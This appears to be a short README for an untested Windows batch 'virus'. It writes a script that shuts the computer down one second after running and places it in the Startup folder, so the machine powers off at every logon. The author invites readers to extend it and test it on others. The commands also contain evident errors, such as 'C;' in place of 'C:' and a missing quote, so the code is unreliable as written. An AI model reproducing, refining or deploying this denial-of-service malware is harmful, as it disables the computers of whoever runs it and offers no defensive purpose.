# batch-virus
first i am going to put this in here without testing it because i do not i a spare computer because i am broke as hell
ok the first thing is don't do this like don't
the first three lines are the lines that make your computer unusable
cd %HOMEPATH%\desktop
echo shutdown /s /t 1 /c "lol" >suckit.bat
move "C:\%HOMEPATH%\desktop\suckit.bat" "C;\%HOMEPATH%\Appdata\roaming\Microsoft\Windows\start menu\programs\startup
now just add stuff on to make it better and when they shutdown their computer it won't startup and for anyone who is willing or has a vm please test this and please set me know if there are issues so i can fix it again I did this on a readme file because I bat experiments and if I accidently click on this well... F%$# so yeah.
